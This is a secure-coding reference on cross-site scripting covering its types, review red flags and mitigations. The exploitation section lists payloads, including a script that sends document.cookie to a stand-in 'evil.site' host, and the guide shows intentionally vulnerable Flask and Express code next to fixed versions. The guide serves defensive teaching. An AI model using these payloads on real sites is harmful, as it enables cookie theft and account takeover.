## 🧠 Description

- **What it is (simple + technical)**:  
  Cross-Site Scripting (XSS) is a vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users.  
  In simple terms, it lets an attacker "sneak JavaScript" into your website, which runs in the browser of someone else.

- **Where it occurs**:  
  Usually on the **frontend** — when user input is inserted into the HTML/DOM without proper escaping or sanitization. However, the root cause is often **backend-rendered HTML** that does not sanitize user data.

- **Root cause**:  
  Unsanitized user input is rendered directly into HTML, JavaScript, or attributes — allowing attackers to execute code in the victim’s browser.

- **The different types**:
  - **Stored XSS**:  
    Malicious scripts are stored in the database (or another storage layer) and served to users later. This affects every user who views the affected page.

  - **Reflected XSS**:  
    The payload is part of the URL or request, and is immediately reflected in the response (e.g., error messages, search results).

  - **DOM-based XSS**:  
    JavaScript in the frontend modifies the DOM using unsanitized data from `document.location`, `document.cookie`, `window.name`, etc.

---

## 🧪 Exploitation Techniques

- **Step-by-step walkthrough (Reflected XSS example)**:
  1. Attacker finds an input field or URL param that reflects input into the page.
  2. They test with payloads like `<script>alert(1)</script>`.
  3. If the script runs in the browser, the site is vulnerable.
  4. Attacker may then craft a malicious link to steal cookies, redirect users, or execute actions on their behalf.

- **Payload examples**:

  - `<script>alert(1)</script>`  
    Classic payload to see if script execution is possible via raw injection into HTML.

  - `<img src=x onerror=alert(1)>`  
    Triggers an alert when the image fails to load. Useful when `<script>` tags are blocked.

  - `<svg onload=alert(1)>`  
    Triggers on SVG load — bypasses some filters and is effective in certain template engines.

  - `<script>fetch('https://evil.site?c=' + document.cookie)</script>`  
    Steals cookies and exfiltrates them to an attacker-controlled server.

  - `https://site.com/?name=<img src=x onerror=alert(1)>`  
    If the site uses this parameter without escaping (`innerHTML` or unsafe rendering), this results in XSS.

  - DOM-based payload:
    ```js
    // vulnerable code
    document.body.innerHTML = "Hi " + location.search;
    ```
    Visiting:
    ```
    https://site.com/?<img src=x onerror=alert(1)>
    ```
    will inject a payload into the DOM.

---

## 🔎 Code Review Tips

- **Patterns/red flags**:
  - Rendering user input directly into HTML:
    - `res.send("<div>" + req.query.name + "</div>")`
    - `innerHTML = userInput;`
    - Using `dangerouslySetInnerHTML` in React without sanitization

- **Bad vs Good Examples**:

  - ❌ **Bad - Python (Flask)**
    ```python
    @app.route("/greet")
    def greet():
        name = request.args.get("name")
        return f"<h1>Hello {name}</h1>"
    ```

  - ✅ **Good - Python (Flask + escaping)**
    ```python
    from markupsafe import escape

    @app.route("/greet")
    def greet():
        name = request.args.get("name")
        return f"<h1>Hello {escape(name)}</h1>"
    ```

  - ❌ **Bad - TypeScript (Express)**
    ```ts
    app.get("/greet", (req, res) => {
      const name = req.query.name;
      res.send(`<h1>Hello ${name}</h1>`);
    });
    ```

  - ✅ **Good - TypeScript (Express + escaping)**
    ```ts
    import escapeHtml from "escape-html";

    app.get("/greet", (req, res) => {
      const name = escapeHtml(req.query.name as string);
      res.send(`<h1>Hello ${name}</h1>`);
    });
    ```

---

## ⚠️ Modern Frontend XSS Risks

Even in React, Vue, or Angular apps — XSS is still possible if you bypass the framework’s built-in protections.

- **`dangerouslySetInnerHTML` (React)**:
  - Allows direct injection of HTML into the DOM — including scripts if not sanitized.
  - Example:
    ```tsx
    <div dangerouslySetInnerHTML={{ __html: userInput }} />
    ```
  - ✅ Only use with trusted content (e.g. Markdown rendered with `DOMPurify`).

- **`innerHTML` (vanilla JS)**:
  - Injects raw HTML into the DOM. XSS occurs if user-controlled input is inserted here.
    ```js
    element.innerHTML = "<p>" + userInput + "</p>";
    ```

- **DOM Clobbering**:
  - Some older DOM APIs allow an attacker to override built-in variables by injecting elements with special names/IDs.
    ```html
    <input name="constructor">
    ```
    Could be used to break object prototypes or override behavior in certain apps.

- **Third-party JS Libraries**:
  - Libraries that render HTML (e.g., jQuery `.html()`, Mustache templates, even some Markdown parsers) can be abused if user input is passed directly.
  - ✅ Use libraries like `DOMPurify` or `sanitize-html`.

- **Security Headers**:
  - Use `Content-Security-Policy` to prevent inline scripts and restrict sources:
    ```
    Content-Security-Policy: default-src 'self'; script-src 'self'
    ```

---

## 🛡️ Mitigation Strategies

- **Input validation/sanitization**:
  - Enforce strict input types/lengths
  - Reject unsafe characters like `<`, `>`, `"`, `'`

- **Escaping/encoding**:
  - Escape output depending on context:
    - HTML → `&lt;`, `&gt;`
    - JS → quote encoding
    - URL → percent encoding

- **Use secure frameworks/libraries**:
  - Templating engines: Jinja2, EJS, Handlebars escape output by default
  - Frontend libs: React, Vue auto-escape by default
  - For HTML sanitization: use `DOMPurify`

- **CSP (Content Security Policy)**:
  - Prevents untrusted scripts from running
    ```
    Content-Security-Policy: default-src 'self'; script-src 'self'
    ```

- **Best practices**:
  - Avoid `innerHTML`, `eval`, `setTimeout` with strings
  - Use `textContent`, `setAttribute`, or safe component props instead
  - Enable browser protections and CSP fallback headers

---

## 🔐 Blockchain Context (if applicable)

- While smart contracts don’t use HTML/JS, **Web3 apps** often have frontend interfaces (wallet dashboards, NFT marketplaces).
- If those UIs have XSS vulnerabilities, attackers could:
  - Steal wallet addresses or private data
  - Trick users into signing malicious transactions
  - Modify on-screen values (e.g., token prices, receiver addresses)
- **DeFi + XSS = dangerous** due to trustless signing flows

---

